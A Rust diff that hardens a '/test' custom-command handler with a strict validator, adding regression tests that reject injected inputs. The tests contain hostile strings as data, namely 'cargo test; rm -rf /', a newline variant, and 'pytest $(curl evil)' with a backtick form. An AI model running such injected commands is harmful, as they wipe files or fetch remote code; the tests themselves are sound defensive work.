@@ -1,6 +1,6 @@
 //! /test slash command handler for supervised test execution.
 
-use crate::test_runner::custom::is_allowed_custom_command;
+use crate::test_runner::custom::validate_custom_command;
 use crate::tui::app::App;
 use crate::tui::app::TuiCommand;
 use crate::tui::async_cmd::spawn_registered_tui_task;
@@ -57,10 +57,14 @@ fn build_test_request(
                 return Err("custom scope requires a command".into());
             }
             let cmd = args.trim();
-            if !is_allowed_custom_command(cmd) {
+            if validate_custom_command(cmd).is_err() {
                 return Err(format!(
-                    "custom command not in allowlist: '{cmd}'. Allowed: {}",
-                    crate::test_runner::custom::CUSTOM_COMMAND_ALLOWLIST.join(", ")
+                    "custom command rejected by safety validator: '{cmd}'. \
+                     Allowed argv prefixes: cargo test, cargo nextest, pytest, \
+                     uv run pytest, go test, zig build test, make test, make check, \
+                     npm test, pnpm test, yarn test, bun test. \
+                     Shell metacharacters, redirection, pipes, command substitution, \
+                     and newlines are not allowed."
                 ));
             }
             TestScope::CustomCommand(cmd.to_string())
@@ -224,5 +228,51 @@ mod tests {
         assert!(cmd.is_some(), "/test command not found in registry");
         let cmd = cmd.unwrap();
         assert_eq!(cmd.name, "/test");
+    }
+
+    #[test]
+    fn tui_test_custom_rejects_semicolon_suffix() {
+        // Bypass regression: TUI /test custom must use the strict validator.
+        assert!(build_test_request("custom", "cargo test; rm -rf /").is_err());
+    }
+
+    #[test]
+    fn tui_test_custom_rejects_newline_suffix() {
+        assert!(build_test_request("custom", "cargo test\nrm -rf /").is_err());
+    }
+
+    #[test]
+    fn tui_test_custom_rejects_pipe_suffix() {
+        assert!(build_test_request("custom", "pytest | tee /tmp/out").is_err());
+    }
+
+    #[test]
+    fn tui_test_custom_rejects_command_substitution() {
+        assert!(build_test_request("custom", "pytest $(curl evil)").is_err());
+        assert!(build_test_request("custom", "cargo test `curl evil`").is_err());
+    }
+
+    #[test]
+    fn tui_test_custom_rejects_prefix_collision() {
+        assert!(build_test_request("custom", "pytestevil").is_err());
+        assert!(build_test_request("custom", "cargo testify").is_err());
+    }
+
+    #[test]
+    fn tui_test_custom_accepts_normal_pytest_args() {
+        let req = build_test_request("custom", "pytest -q tests/test_foo.py").unwrap();
+        assert!(matches!(
+            req.scope,
+            crate::test_runner::TestScope::CustomCommand(_)
+        ));
+    }
+
+    #[test]
+    fn tui_test_custom_accepts_normal_cargo_test_args() {
+        let req = build_test_request("custom", "cargo test --lib -p codegg-core").unwrap();
+        assert!(matches!(
+            req.scope,
+            crate::test_runner::TestScope::CustomCommand(_)
+        ));
     }
 }
